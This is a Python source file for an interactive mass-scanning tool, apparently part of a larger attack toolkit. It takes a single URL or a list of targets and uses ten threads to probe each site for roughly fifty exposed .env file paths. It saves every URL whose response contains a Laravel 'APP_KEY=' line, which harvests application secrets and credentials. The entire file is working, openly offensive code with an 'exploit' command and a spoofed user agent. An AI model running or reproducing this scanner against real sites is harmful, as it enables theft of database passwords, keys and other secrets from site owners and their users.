import requests as req
from lib.colors import *
from multiprocessing.dummy import Pool
import os

class getEnv:
    def __init__(self):
        self.options = {
            "TARGET": {
                "value" : None,
                "required" : True,
                "description" : "Target URL or list target url."
            }
        }
        self.commands = {
            "exploit": self.run_exploit,
            "set": self.set_option,
            "show": self.show_options,
            "exit": self.exit_shell
        }
        self.running = True

    def shell(self):
        pl = f'{light.blue}={close.reset}'*50
        print(f"""
\t{pl}\n
\t\t\tAUTO GET ENV\n
\tcommand 'options' view for options this tool\n
\t{pl}
          """)
        while self.running:
            cmd = input(f"\t{light.cyan}Ethopia > {close.reset}").strip().split()
            if cmd:
                command = cmd[0]
                args = cmd[1:]
                if command in self.commands:
                    self.commands[command](args)
                else:
                    print(f"Unknown command: {command}")
    def set_option(self, args):
        if len(args) >= 2:
            option = args[0].upper()
            value = " ".join(args[1:])
            if option in self.options:
                self.options[option]["value"] = value
                print(f"Set {option} to {value}")
            else:
                print(f"Invalid option: {option}")
        else:
            print("Usage: set OPTION VALUE")
    def show_options(self, args):
        print(f"\n\tPlugins option ({light.magenta}Auto Get Env{close.reset})\n")
        print(f"\t{'Name':<10} {'Current Setting':<20} {'Required':<10} {'Description':<40}")
        print(f"\t{'-'*10} {'-'*20} {'-'*10} {'-'*40}")
        for option, details in self.options.items():
            value = details["value"] if details["value"] else ""
            required = "yes" if details["required"] else "no"
            description = details["description"]
            print(f"\t{option:<10} {value:<20} {required:<10} {description:<40}")
        print("")
    def exit_shell(self, args):
        self.running = False
        print("Exiting...")

    def start(self):
        self.shell()
    
    # Engine Exploit
    def env(self, target):
        try:
            dict = ['.env', '../.env', '../../.env', '../../../.env', 'vendor/.env ', 'lib/.env ', 'lab/.env  ', 'cronlab/.env', 'cron/.env', 'core/.env', 'core/app/.env', 'core/Database/.env ', 'database/.env ', 'system/.env', 'config/.env ', 'assets/.env ', 'fileweb/.env', 'l53/.env', 'club/.env', 'app/.env ', 'apps/.env', 'uploads/.env ', 'sitemaps/.env ', 'site/.env ', 'admin/.env ', 'web/.env ', 'public/.env ', 'resources/.env', 'sistema/.env', 'en/.env ', 'tools/.env', 'clientes/.env', 'clientes/laravel_inbox/.env', 'clientes/laravel/.env', 'v1/.env ', 'administrator/.env ', 'laravel/.env', 'website/.env', 'api/.env', 'vendor/.env', 'local/.env', 'web/.env', 'home/.env', 'main/.env', 'pemerintah/.env', 'api2/.env', 'api3/.env', 'webs/.env', 'asset/.env']
            userAgent = {
                'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36' # you can change this if you have connection issue or maybe they block you user agent
            }
            for x in range(0, len(dict)):
                    r  = req.get(f"{target}/{dict[x]}", headers=userAgent, timeout=30)
                    if r.status_code == 200 and "APP_KEY=" in r.text:
                        print(f"[{light.green} + {close.reset}] => {target}/{dict[x]}")
                        with open("result/resultsEnv.txt", "a") as ap:
                            ap.write(f"{target}/{dict[x]}")
                            ap.writelines("\n")
                        break
        except:
            pass
        print(f"[{dark.red} ! {close.reset}] {target} => skiping")
    def get_targets(self):
        target_option = self.options["TARGET"]["value"]
        if os.path.isfile(target_option):
            with open(target_option, 'r') as file:
                targets = [line.strip() for line in file.readlines()]
        else:
            targets = [target_option]
        return targets
    def run_exploit(self, *args):
        targets = self.get_targets()
        pool = Pool(10)
        pool.map(self.env, targets)
        pool.close()
        pool.join()

if __name__ == "__main__":
    envFinder = getEnv()
    envFinder.start()
